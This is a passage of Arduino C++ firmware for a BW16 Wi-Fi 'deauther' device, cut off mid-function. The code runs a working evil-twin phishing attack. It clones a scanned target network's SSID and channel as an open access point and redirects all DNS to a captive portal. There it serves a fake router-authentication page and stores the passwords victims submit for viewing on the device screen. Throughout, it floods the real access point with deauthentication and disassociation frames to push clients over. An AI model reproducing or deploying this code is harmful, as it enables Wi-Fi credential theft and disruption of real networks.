                 scan_results[chosenIndex].bssid[1],
                 scan_results[chosenIndex].bssid[2],
                 scan_results[chosenIndex].bssid[3],
                 scan_results[chosenIndex].bssid[4],
                 scan_results[chosenIndex].bssid[5]);
        chosenSsid = String(mac);
      }
      web_test_channel_dynamic = scan_results[chosenIndex].channel;
    }
  }
  if (chosenSsid.length() == 0) chosenSsid = String("BW16-AP");
  if (web_test_channel_dynamic <= 0) web_test_channel_dynamic = WEB_TEST_CHANNEL;
  // SSID
  web_test_ssid_dynamic = chosenSsid;
  // 
  snprintf(test_channel_str, sizeof(test_channel_str), "%d", web_test_channel_dynamic);
  char webtest_ssid_buf[64];
  strncpy(webtest_ssid_buf, web_test_ssid_dynamic.c_str(), sizeof(webtest_ssid_buf) - 1);
  webtest_ssid_buf[sizeof(webtest_ssid_buf) - 1] = '\0';
  // BW16-deauther2 AP
  int status = WL_IDLE_STATUS;
  unsigned long startTs = millis();
  const unsigned long AP_START_TIMEOUT_MS = 15000;
  while (status != WL_CONNECTED && (millis() - startTs) < AP_START_TIMEOUT_MS) {
    // 3AP
    status = WiFi.apbegin(webtest_ssid_buf, test_channel_str, (uint8_t)0);
    if (status != WL_CONNECTED) {
      // 4，NULLAP
      status = WiFi.apbegin(webtest_ssid_buf, (char*)NULL, test_channel_str, (uint8_t)0);
    }
    if (status != WL_CONNECTED) {
      delay(1000);
    }
  }
  if (status == WL_CONNECTED) {
    Serial.println("AP mode OK");
    Serial.println("SSID: " + chosenSsid);
    Serial.println("Pass: <none>");
    Serial.println("CH: " + String(web_test_channel_dynamic));
    IPAddress apIp = WiFi.localIP();
    Serial.print("IP: ");
    Serial.println(apIp);

    // DNSWeb
    startPhishingServices(apIp);

    startWebUILED();

    Serial.println("Phishing ready, waiting...");
    // ，
    unsigned long nowInit = millis();
    lastPhishingDeauthMs = nowInit;
    lastPhishingBroadcastMs = nowInit;
    if (phishingHasTarget) {
      int dummy = 0;
      // ：
      if (g_enhancedDeauthMode) {
        // ：15 * 6 = 90
        sendDeauthBatchEnhanced(phishingTargetBSSID, 15, dummy);
      } else {
        // ：10 * 3 = 30
        sendDeauthBurstToBssidUs(phishingTargetBSSID, 10, dummy, 250);
      }
    }
    return true;
  } else {
    Serial.println("AP mode failed!");
    return false;
  }
}

// ============ ============

// Web
void stopWebServer() {
  if (web_server_active) {
    Serial.println("Stop Web server...");
    web_server.stop();
    web_server_active = false;
  }
}

// DNS
void stopDNSServer() {
  if (dns_server_active) {
    Serial.println("Stop DNS...");
    dnsServer.stop();
    dns_server_active = false;
  }
}

// WiFi
void disconnectWiFi() {
  Serial.println("Disconnect WiFi...");
  WiFi.disconnect();
}

// 
void cleanupClients(int maxClients = 10) {
  Serial.println("Cleanup clients...");
  for (int i = 0; i < maxClients; i++) {
    WiFiClient client = web_server.available();
    if (client) {
      client.stop();
      delay(10);
    } else {
      break;
    }
  }
}

// 
void cleanupPhishingMemory() {
  Serial.println("Cleanup memory...");
  web_test_submitted_texts.clear();
  web_test_submitted_texts.shrink_to_fit();
}

// 
void resetPhishingState() {
  web_test_active = false;
  g_webTestLocked = true;
  webtest_ui_page = 0;
  webtest_password_scroll = 0;
  webtest_password_cursor = 0;
  webtest_border_always_on = false;
  webtest_flash_remaining_toggles = 0;
  webtest_border_flash_visible = true;
}

// 
void stopAllAttacks() {
  if (deauthAttackRunning) {
    Serial.println("Stop deauth...");
    deauthAttackRunning = false;
    attackstate = 0;
  }
  
  if (beaconAttackRunning) {
    Serial.println("Stop beacon...");
    beaconAttackRunning = false;
    becaonstate = 0;
  }
}

// WiFi
void resetWiFiModule() {
  Serial.println("Reset WiFi...");
  wifi_off();
  delay(200);
  wifi_on(RTW_MODE_AP);
  delay(200);
}

// 
void startPhishingServices(IPAddress apIp) {
  // 
  stopDNSServer();
  stopWebServer();
  
  // DNS
  dnsServer.setResolvedIP(apIp[0], apIp[1], apIp[2], apIp[3]);
  dnsServer.begin();
  dns_server_active = true;
  
  // Web
  web_server.begin();
  web_server_active = true;
  web_test_active = true;
  
  Serial.println("Phishing started");
}

// Web UI
void startWebUIServices(IPAddress apIp) {
  // 
  stopDNSServer();
  stopWebServer();
  
  // DNS
  dnsServer.setResolvedIP(apIp[0], apIp[1], apIp[2], apIp[3]);
  dnsServer.begin();
  dns_server_active = true;
  
  // Web
  web_server.begin();
  web_server_active = true;
  web_ui_active = true;
  
  Serial.println("Web UI started");
}

// 
void showPhishingStatus(const String& line1, const String& line2, int delayMs = 2000) {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 15);
  u8g2_for_adafruit_gfx.print(line1);
  u8g2_for_adafruit_gfx.setCursor(5, 35);
  u8g2_for_adafruit_gfx.print(line2);
  display.display();
  delay(delayMs);
}

// AP
void restartOriginalAP() {
  Serial.println("Restart orig AP...");
  String channelStr = String(current_channel);
  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
    Serial.println("Orig AP OK");
  } else {
    Serial.println("Orig AP fail");
  }
}

// 
void checkAndCleanupPhishingProcesses() {
  if (web_test_active || web_server_active || dns_server_active) {
    Serial.println("Stale phishing, force clean...");
    forceCleanupWebTest();
    delay(500); // 
  }
}

// 
void cleanupBeforePhishingStart() {
  Serial.println("Cleanup services...");
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();
  cleanupPhishingMemory();
  
  // 
  webtest_ui_page = 0;
  webtest_password_scroll = 0;
  webtest_password_cursor = 0;
  webtest_border_always_on = false;
  webtest_flash_remaining_toggles = 0;
  webtest_border_flash_visible = true;
  
  delay(100);
  // AP，SDK
  resetWiFiModule();
}

// （）
void stopPhishingServices() {
  // 
  stopAllAttacks();
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();
  cleanupPhishingMemory();
  resetPhishingState();
  closeWebUILED();
  
  // WiFi
  resetWiFiModule();
  
  // AP
  restartOriginalAP();
  
  // 
  showPhishingStatus("Phishing stopped", "Related cleaned", 2000);
}

// 
void performPhishingHealthCheck(unsigned long currentTime) {
  static unsigned long last_health_check = 0;
  if (currentTime - last_health_check >= 30000) { // 30
    last_health_check = currentTime;
    
    // WebDNS
    if (web_test_active && (!web_server_active || !dns_server_active)) {
      Serial.println("Phishing abnormal, auto clean...");
      forceCleanupWebTest();
      return;
    }
    
    // 
    if (web_test_submitted_texts.size() > 500) {
      Serial.println("Phishing data overflow, clean...");
      web_test_submitted_texts.erase(web_test_submitted_texts.begin(), web_test_submitted_texts.begin() + 200);
      web_test_submitted_texts.shrink_to_fit();
    }
  }
}

// Web UI
void performWebUIHealthCheck(unsigned long currentTime) {
  static unsigned long last_health_check = 0;
  if (currentTime - last_health_check >= 30000) { // 30
    last_health_check = currentTime;
    
    // WebDNS
    if (web_ui_active && (!web_server_active || !dns_server_active)) {
      Serial.println("WebUI abnormal, auto clean...");
      forceCleanupWebUI();
      return;
    }
    
    // Web UI
    if (web_ui_active != web_server_active) {
      Serial.println("WebUI inconsistent, clean...");
      forceCleanupWebUI();
      return;
    }
  }
}

// 
void checkEmergencyStop() {
  if (digitalRead(BTN_UP) == LOW && digitalRead(BTN_DOWN) == LOW && digitalRead(BTN_OK) == LOW) {
    if (web_test_active) {
      Serial.println("E-stop phishing clean...");
      forceCleanupWebTest();
      // 
      showPhishingStatus("Emergency stop done", "Resources cleaned", 3000);
    } else if (web_ui_active) {
      Serial.println("E-stop WebUI clean...");
      forceCleanupWebUI();
      // 
      showPhishingStatus("Web UI e-stop", "Resources cleaned", 3000);
    }
    // 
    while (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW || digitalRead(BTN_OK) == LOW) {
      delay(10);
    }
  }
}

// ，
void stabilizeButtonState() {
  // 
  delay(200);
  // 
  while (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW || 
         digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
    delay(10);
  }
  delay(100); // 
}

// （）
void forceCleanupWebTest() {
  Serial.println("=== Force clean phishing ===");
  
  // 
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients(20);
  cleanupPhishingMemory();
  resetPhishingState();
  stopAllAttacks();
  closeWebUILED();
  
  Serial.println("Force cleanup done");
}

// Web UI（）
void forceCleanupWebUI() {
  Serial.println("=== Force clean WebUI ===");
  
  // 
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients(20);
  
  // Web UI
  web_ui_active = false;
  g_webUILocked = false;
  
  // LED
  closeWebUILED();
  
  Serial.println("Web UI force clean");
}
// ============ Web UI ============

// Web UI
void startWebUI() {
  Serial.println("=== Start WebUI ===");
  Serial.println("Close orig AP...");
  
  // ：Web UI
  if (web_ui_active || web_server_active || dns_server_active) {
    Serial.println("Stale WebUI, force clean...");
    forceCleanupWebUI();
    delay(500); // 
  }
  
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 
  u8g2_for_adafruit_gfx.setCursor(5, 15);
  u8g2_for_adafruit_gfx.print("Starting Web UI...");
  display.display();
  
  // 
  Serial.println("Cleanup services...");
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();
  
  // WiFiAP，SDK
  resetWiFiModule();
  
  // WebUIAP
  Serial.println("Start WebUI AP...");
  char channel_str[4];
  sprintf(channel_str, "%d", WEB_UI_CHANNEL);
  if (WiFi.apbegin(WEB_UI_SSID, WEB_UI_PASSWORD, channel_str, 0)) {
    Serial.println("WebUI AP OK");
    Serial.println("SSID: " + String(WEB_UI_SSID));
    Serial.println("Pass: " + String(WEB_UI_PASSWORD));
    Serial.println("CH: " + String(WEB_UI_CHANNEL));
    IPAddress apIp = WiFi.localIP();
    Serial.print("IP: ");
    Serial.println(apIp);
    
    // Web UI
    startWebUIServices(apIp);
    
    // WebUI，AP
    g_webUILocked = true;
    
    // LED：
    startWebUILED();
    
    // （，SSID/）
    display.clearDisplay();
    {
      const char* line1 = "192.168.1.1";
      int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
      int x1 = (display.width() - w1) / 2; if (x1 < 0) x1 = 0;
      u8g2_for_adafruit_gfx.setCursor(x1, 10);
      u8g2_for_adafruit_gfx.print(line1);
    }
    // SSID 
    {
      String ssidLine = String("SSID: ") + String(WEB_UI_SSID);
      int textW = u8g2_for_adafruit_gfx.getUTF8Width(ssidLine.c_str());
      const int y = 25;
      int x = 0;
      if (textW <= display.width() - 2) {
        x = (display.width() - textW) / 2; if (x < 0) x = 0;
        u8g2_for_adafruit_gfx.setCursor(x, y);
        u8g2_for_adafruit_gfx.print(ssidLine);
      } else {
        // ，0
        int startX = 0;
        u8g2_for_adafruit_gfx.setCursor(2 - startX, y);
        u8g2_for_adafruit_gfx.print(ssidLine);
        u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, y);
        u8g2_for_adafruit_gfx.print(ssidLine);
      }
    }
    // 
    {
      String pwdLine = String("Pass: ") + String(WEB_UI_PASSWORD);
      int textW = u8g2_for_adafruit_gfx.getUTF8Width(pwdLine.c_str());
      const int y = 40;
      int x = 0;
      if (textW <= display.width() - 2) {
        x = (display.width() - textW) / 2; if (x < 0) x = 0;
        u8g2_for_adafruit_gfx.setCursor(x, y);
        u8g2_for_adafruit_gfx.print(pwdLine);
      } else {
        int startX = 0;
        u8g2_for_adafruit_gfx.setCursor(2 - startX, y);
        u8g2_for_adafruit_gfx.print(pwdLine);
        u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, y);
        u8g2_for_adafruit_gfx.print(pwdLine);
      }
    }
    {
      const char* line4 = "BACK to exit";
      int w4 = u8g2_for_adafruit_gfx.getUTF8Width(line4);
      int x4 = (display.width() - w4) / 2; if (x4 < 0) x4 = 0;
      u8g2_for_adafruit_gfx.setCursor(x4, 55);
      u8g2_for_adafruit_gfx.print(line4);
    }
    display.display();
    
    Serial.println("WebUI ready, waiting client...");
    delay(3000);
  } else {
    Serial.println("WebUI AP fail!");
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("Web UI fail!");
    display.display();
    delay(2000);
  }
}

// Web UI
void stopWebUI() {
  if (web_ui_active) {
    Serial.println("=== Close WebUI ===");
    
    // 
    stopWebServer();
    stopDNSServer();
    disconnectWiFi();
    cleanupClients();
    
    // Web UI
    web_ui_active = false;
    g_webUILocked = false;
    
    // LED：
    closeWebUILED();
    
    // WiFi
    resetWiFiModule();
    
    // AP
    restartOriginalAP();
    
    // 
    showPhishingStatus("Web UI stopped", "Resources cleaned", 2000);
    
    Serial.println("WebUI closed, cleaned");
  }
}

// Web Test
void stopWebTest() {
  if (web_test_active) {
    Serial.println("=== Stop Phishing ===");
    
    // 
    stopPhishingServices();
    
    Serial.println("Phishing stopped, cleaned");
  }
}

// Web Test
void handleWebTestClient(WiFiClient& client) {
  String request = "";
  unsigned long timeout = millis() + 3000;
  while (client.connected() && millis() < timeout) {
    if (client.available()) {
      char c = client.read();
      request += c;
      if (request.endsWith("\r\n\r\n")) break;
    }
    delay(1);
  }

  String method = "GET";
  String path = "/";
  int firstSpace = request.indexOf(' ');
  int secondSpace = request.indexOf(' ', firstSpace + 1);
  if (firstSpace > 0 && secondSpace > firstSpace) {
    method = request.substring(0, firstSpace);
    path = request.substring(firstSpace + 1, secondSpace);
  }

  // POST（ /auth）
  String body = "";
  if (method == "POST") {
    int contentLengthPos = request.indexOf("Content-Length: ");
    if (contentLengthPos >= 0) {
      int contentLengthEnd = request.indexOf("\r\n", contentLengthPos);
      if (contentLengthEnd > contentLengthPos) {
        String contentLengthStr = request.substring(contentLengthPos + 16, contentLengthEnd);
        int contentLength = contentLengthStr.toInt();
        if (contentLength > 0) {
          unsigned long bodyTimeout = millis() + 2000;
          while (client.available() < contentLength && millis() < bodyTimeout) {
            delay(1);
          }
          for (int i = 0; i < contentLength && client.available(); i++) {
            body += (char)client.read();
          }
          request += body;
        }
      }
    }
  }

  // Captive Portal ：200，
  if (path == "/generate_204" || path == "/gen_204" || path == "/ncsi.txt" || path == "/hotspot-detect.html" || path.startsWith("/connecttest.txt") || path.startsWith("/library/test/success.html") || path.startsWith("/success.txt")) {
    String body = "<html><head><meta http-equiv=\"refresh\" content=\"0; url=/\"></head><body></body></html>";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: text/html\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Content-Length: " + String(body.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(body);
  }
  else if (path == "/" || path == "/index.html") {
    // APHTML
    String header = "HTTP/1.1 200 OK\r\n";
    header += "Content-Type: text/html; charset=UTF-8\r\n";
    header += "Cache-Control: public, max-age=300\r\n";
    switch (g_apSelectedPage) {
      case AP_WEB_TEST:
        {
          size_t pageLen = strlen_P(WEB_AUTH1_HTML);
          header += "Content-Length: " + String(pageLen) + "\r\n";
          header += "Connection: close\r\n\r\n";
          client.print(header);
          client.print(F(WEB_AUTH1_HTML));
        }
        break;
      case AP_WEB_ROUTER_AUTH:
      default: {
        // {SSID} WiFiSSID，WEB_UI_SSID
        String page = FPSTR(WEB_AUTH2_HTML);
        String targetSsid = web_test_active ? web_test_ssid_dynamic : String(WEB_UI_SSID);
        page.replace("{SSID}", targetSsid);
        header += "Content-Length: " + String(page.length()) + "\r\n";
        header += "Connection: close\r\n\r\n";
        client.print(header);
        client.print(page);
        break;
      }
    }
  } else if (path == "/status") {
    handleStatusRequest(client);
  
  } else if (path == "/auth" && method == "POST") {
    // JSON {"text":"..."}
    String text = "";
    int tPos = body.indexOf("\"text\":");
    if (tPos >= 0) {
      int firstQuote = body.indexOf('"', tPos + 6);
      if (firstQuote >= 0) {
        int secondQuote = body.indexOf('"', firstQuote + 1);
        if (secondQuote > firstQuote) {
          text = body.substring(firstQuote + 1, secondQuote);
        }
      }
    }
    // 
    if (text.length() > 0) {
      web_test_submitted_texts.push_back(text);
      if (!webtest_border_always_on) {
        // ：
        webtest_border_always_on = true;
        webtest_flash_remaining_toggles = 0;
        webtest_border_flash_visible = true;
      } else {
        // ：（4）
        webtest_flash_remaining_toggles = 4;
        webtest_last_flash_toggle_ms = millis();
        // ：""
        webtest_border_flash_visible = false;
      }
      // ，
      if (web_test_submitted_texts.size() > 200) {
        web_test_submitted_texts.erase(web_test_submitted_texts.begin(), web_test_submitted_texts.begin() + 50);
      }
    }

    String body = "{\"success\":true}";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/json\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Content-Length: " + String(body.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(body);
  } else {
    String hdr = "HTTP/1.1 302 Found\r\n";
    hdr += "Location: /\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
  }
  client.stop();
}

// Web Test
void sendWebTestPage(WiFiClient& client) {
  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: text/html; charset=UTF-8\r\n";
  header += "Connection: close\r\n\r\n";
  client.print(header);
  // ：
  switch (g_apSelectedPage) {
    case AP_WEB_TEST: client.print(F(WEB_AUTH1_HTML)); break;
    case AP_WEB_ROUTER_AUTH:
    default: {
      String page = FPSTR(WEB_AUTH2_HTML);
      String targetSsid = web_test_active ? web_test_ssid_dynamic : String(WEB_UI_SSID);
      page.replace("{SSID}", targetSsid);
      client.print(page);
      break;
    }
  }
}

// OLED：AP（）
bool apWebPageSelectionMenu() {
  // /，，128x64
  int sel = g_apSelectedPage;
  const int RECT_H = HOME_RECT_HEIGHT;
  if (sel < 0 || sel >= AP_MENU_ITEM_COUNT) sel = 0;

  // ，
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    if (digitalRead(BTN_BACK) == LOW) { return false; }
    if (digitalRead(BTN_OK) == LOW) { g_apSelectedPage = sel; return true; }
    if (digitalRead(BTN_UP) == LOW) { 
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if (sel > 0) sel--; 
      lastUpTime = currentTime;
    }
    if (digitalRead(BTN_DOWN) == LOW) { 
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if (sel < AP_MENU_ITEM_COUNT - 1) sel++; 
      lastDownTime = currentTime;
    }

    // 
    display.clearDisplay();
    display.setTextSize(1);
    g_apBaseStartIndex = 0;
    g_apSkipRelIndex = sel; // 
    drawApMenuBase_NoFlush();
    g_apSkipRelIndex = -1;
    // Y（）
    int y = 20 + sel * HOME_ITEM_HEIGHT;
    display.drawRoundRect(0, y, display.width() - UI_RIGHT_GUTTER, RECT_H, 4, SSD1306_WHITE);
    // 1
    {
      int textY = y + 13; // +12， +1
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setCursor(6, textY);
      if (sel >= 0 && sel < AP_MENU_ITEM_COUNT) {
        u8g2_for_adafruit_gfx.print(g_apMenuItems[sel]);
      }
    }
    display.display();
  }
}

// OLED：
void showAuthTextOnOLED(const String& text) {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 15);
  u8g2_for_adafruit_gfx.print("Auth content:");
  u8g2_for_adafruit_gfx.setCursor(5, 32);
  u8g2_for_adafruit_gfx.print(text);
  u8g2_for_adafruit_gfx.setCursor(5, 55);
  u8g2_for_adafruit_gfx.print("Press BACK");
  display.display();
}
// ：，，
void showModalMessage(const String& line1, const String& line2) {
  const int rectW = 116;
  const int rectH = 36;
  const int rx = (display.width() - rectW) / 2;
  const int ry = (display.height() - rectH) / 2;
  // ：，，
  display.fillRoundRect(rx, ry, rectW, rectH, 4, SSD1306_BLACK);
  display.drawRoundRect(rx, ry, rectW, rectH, 4, SSD1306_WHITE);

  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);

  // line1/line2 
  String message = line1;
  if (line2.length() > 0) message += String("\n") + line2;

  const int paddingX = 6;
  const int maxLineWidth = rectW - paddingX * 2;
  const int lineHeight = 14; // 

  // （，）
  std::vector<String> lines;
  int start = 0;
  while (start <= (int)message.length()) {
    int nl = message.indexOf('\n', start);
    if (nl < 0) nl = message.length();
    lines.push_back(message.substring(start, nl));
    if (nl >= (int)message.length()) break;
    start = nl + 1;
  }
  if (lines.empty()) lines.push_back("");

  // 
  int totalTextH = (int)lines.size() * lineHeight;
  int firstBaselineY = ry + (rectH - totalTextH) / 2 + 12; // 

  // 
  for (size_t i = 0; i < lines.size(); i++) {
    const String& s = lines[i];
    int w = u8g2_for_adafruit_gfx.getUTF8Width(s.c_str());
    if (w > maxLineWidth) w = maxLineWidth;
    int x = rx + (rectW - w) / 2;
    int y = firstBaselineY + (int)i * lineHeight;
    u8g2_for_adafruit_gfx.setCursor(x, y);
    u8g2_for_adafruit_gfx.print(s);
  }
  display.display();

  // ，，
  // 
  while (digitalRead(BTN_BACK) != LOW && digitalRead(BTN_OK) != LOW && 
         digitalRead(BTN_UP) != LOW && digitalRead(BTN_DOWN) != LOW) { delay(10); }
  // 
  while (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW ||
         digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) { delay(10); }
  // ，
  unsigned long stableStart = millis();
  while (true) {
    bool anyKeyLow = (digitalRead(BTN_BACK) == LOW) || (digitalRead(BTN_OK) == LOW) ||
                     (digitalRead(BTN_UP) == LOW) || (digitalRead(BTN_DOWN) == LOW);
    if (anyKeyLow) {
      stableStart = millis();
    }
    if (millis() - stableStart >= 200) {
      break;
    }
    delay(10);
  }
}

// AP/SSID："" closes, right"Select"ap/ssid
bool showSelectSSIDConfirmModal() {
  const int rectW = 116;
  const int rectH = 40;
  const int rx = (display.width() - rectW) / 2;
  const int ry = (display.height() - rectH) / 2;

  while (true) {
    // 
    display.fillRoundRect(rx, ry, rectW, rectH, 4, SSD1306_BLACK);
    display.drawRoundRect(rx, ry, rectW, rectH, 4, SSD1306_WHITE);

    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);

    // ：
    String line1 = "Select AP/SSID first";
    int w = u8g2_for_adafruit_gfx.getUTF8Width(line1.c_str());
    if (w > rectW - 12) w = rectW - 12;
    int line1x = rx + (rectW - w) / 2;
    int line1y = ry + 16;
    u8g2_for_adafruit_gfx.setCursor(line1x, line1y);
    u8g2_for_adafruit_gfx.print(line1);

    // ：
    String leftHint = "《 Back";
    String rightHint = "Select 》";
    int hintY = ry + rectH - 8;
    // 
    u8g2_for_adafruit_gfx.setCursor(rx + 6, hintY);
    u8g2_for_adafruit_gfx.print(leftHint);
    // 
    int rightW = u8g2_for_adafruit_gfx.getUTF8Width(rightHint.c_str());
    int rightX = rx + rectW - 6 - rightW;
    u8g2_for_adafruit_gfx.setCursor(rightX, hintY);
    u8g2_for_adafruit_gfx.print(rightHint);

    display.display();

    // ：BACK ，OK 
    if (digitalRead(BTN_BACK) == LOW) {
      // BACK
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      // 
      delay(200);
      return false; // ，
    }
    
    if (digitalRead(BTN_OK) == LOW) {
      // OK
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      // 
      delay(200);
      return true; // AP/SSID
    }

    delay(10);
  }
}

// ： showModalMessage，，
bool showConfirmModal(const String& line1, const String& leftHint, const String& rightHint) {
  const int rectW = 116;
  const int rectH = 40; // 
  const int rx = (display.width() - rectW) / 2;
  const int ry = (display.height() - rectH) / 2;

  while (true) {
    // 
    display.fillRoundRect(rx, ry, rectW, rectH, 4, SSD1306_BLACK);
    display.drawRoundRect(rx, ry, rectW, rectH, 4, SSD1306_WHITE);

    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);

    // ：
    int w = u8g2_for_adafruit_gfx.getUTF8Width(line1.c_str());
    if (w > rectW - 12) w = rectW - 12;
    int line1x = rx + (rectW - w) / 2;
    int line1y = ry + 16; // 
    u8g2_for_adafruit_gfx.setCursor(line1x, line1y);
    u8g2_for_adafruit_gfx.print(line1);

    // ：
    int hintY = ry + rectH - 8; // 
    // 
    u8g2_for_adafruit_gfx.setCursor(rx + 6, hintY);
    u8g2_for_adafruit_gfx.print(leftHint);
    // 
    int rightW = u8g2_for_adafruit_gfx.getUTF8Width(rightHint.c_str());
    int rightX = rx + rectW - 6 - rightW;
    u8g2_for_adafruit_gfx.setCursor(rightX, hintY);
    u8g2_for_adafruit_gfx.print(rightHint);

    display.display();

    // ：BACK ，OK 
    // 
    if (digitalRead(BTN_BACK) == LOW) {
      // BACK
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      // 
      delay(200);
      return false; // 
    }
    
    if (digitalRead(BTN_OK) == LOW) {
      // OK
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      // 
      delay(200);
      return true; // 
    }

    delay(10);
  }
}

// Web UI
void handleWebUI() {
  // 
  if (digitalRead(BTN_BACK) == LOW) {
    // ，
    stabilizeButtonState();
    
    // 
    if (showConfirmModal("Close Web UI")) {
      stopWebUI();
    }
    return;
  }
  
  // Web
  unsigned long currentTime = millis();
  if (currentTime - last_web_check >= WEB_CHECK_INTERVAL) {
    last_web_check = currentTime;
    
    WiFiClient client = web_server.available();
    if (client) {
      handleWebClient(client);
    }
  }
  
  // SSID（）
  if (beaconAttackRunning) {
    executeCustomBeaconFromWeb();
  }
  
  // 
  static unsigned long last_status_update = 0;
  if (currentTime - last_status_update >= 1000) {
    last_status_update = currentTime;
    displayWebUIStatus();
  }
}

// Web Test
void handleWebTest() {
  // ，
  static unsigned long lastUpTime = 0;
  static unsigned long lastDownTime = 0;
  static unsigned long lastBackTime = 0;
  static unsigned long lastOkTime = 0;
  
  // 
  if (webtest_ui_page == 0) {
    drawWebTestMain();
  } else if (webtest_ui_page == 1) {
    drawWebTestInfo();
  } else if (webtest_ui_page == 2) {
    drawWebTestPasswords();
  } else if (webtest_ui_page == 3) {
    drawWebTestStatus();
  }

  // 
  unsigned long currentTime = millis();
  if (digitalRead(BTN_BACK) == LOW) {
    if (currentTime - lastBackTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      // ：，WebTest
      // ，
      stabilizeButtonState();
      
      bool confirmed = showConfirmModal("Stop phishing?");
      if (confirmed) {
        stopWebTest();
      } else {
        // ：，
      }
    } else if (webtest_ui_page == 1) {
      webtest_ui_page = 0;
    } else if (webtest_ui_page == 2) {
      webtest_ui_page = 0;
      webtest_password_cursor = 0;
      webtest_password_scroll = 0;
    } else if (webtest_ui_page == 3) {
      webtest_ui_page = 0;
    }
    lastBackTime = currentTime;
    return;
  }

  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      webtest_ui_page = 1; // 
    } else if (webtest_ui_page == 1) {
      // UP
      webtest_ui_page = 0;
    } else if (webtest_ui_page == 2) {
      if (webtest_password_scroll > 0) webtest_password_scroll--;
    } else if (webtest_ui_page == 3) {
      // UP
      webtest_ui_page = 0;
    }
    lastUpTime = currentTime;
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      webtest_ui_page = 3; // 
    } else if (webtest_ui_page == 1) {
      // DOWN
      webtest_ui_page = 0;
    } else if (webtest_ui_page == 2) {
      if (web_test_submitted_texts.size() > 0) {
        // ：
        if (webtest_password_scroll < (int)web_test_submitted_texts.size() - 1) webtest_password_scroll++;
      }
    } else if (webtest_ui_page == 3) {
      // DOWN
      webtest_ui_page = 0;
    }
    lastDownTime = currentTime;
  }
  // ：OK，BACK/OK
  // OK
  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      webtest_ui_page = 2; // OK
    } else if (webtest_ui_page == 2) {
      // OK
      webtest_ui_page = 0;
    }
    lastOkTime = currentTime;
  }

  // ：（）
  // ：
  if (phishingHasTarget) {
    unsigned long now = millis();
    
    // ：
    if (web_test_active && web_client.connected()) {
      phishingDeauthInterval = 800; // 
      phishingBatchSize = 2; // 
    } else {
      phishingDeauthInterval = 180;  // 
      phishingBatchSize = 6; // 
    }
    
    if (now - lastPhishingDeauthMs >= (unsigned long)phishingDeauthInterval) {
      int dummyCount = 0;
      // ：，
      if (g_enhancedDeauthMode) {
        // ： * 6
        sendDeauthBatchEnhanced(phishingTargetBSSID, phishingBatchSize, dummyCount);
      } else {
        // ：
        sendDeauthBurstToBssidUs(phishingTargetBSSID, phishingBatchSize, dummyCount, 250);
      }
      lastPhishingDeauthMs = now;
    }
    if (now - lastPhishingBroadcastMs >= 1000UL) {
      // ：，
      if (g_enhancedDeauthMode) {
        // ：6，5
        const uint16_t broadcastReasons[] = {1, 4, 7, 8, 15, 16};
        for (int i = 0; i < 6; i++) {
          wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, broadcastReasons[i], 5, 200);
        }
        // 5
        wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 5, 200);
      } else {
